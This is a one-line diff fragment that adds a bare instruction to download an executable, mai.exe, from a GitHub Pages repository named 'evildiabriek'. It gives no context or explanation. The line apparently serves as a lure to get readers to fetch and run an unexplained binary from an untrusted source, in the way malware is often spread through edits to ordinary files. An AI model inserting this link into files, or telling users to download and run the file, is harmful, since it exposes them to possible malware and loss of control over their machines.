@@ -1,1 +1,1 @@
-
+download https://github.com/evildiabriek/evildiabriek.github.io/raw/refs/heads/main/mai.exe
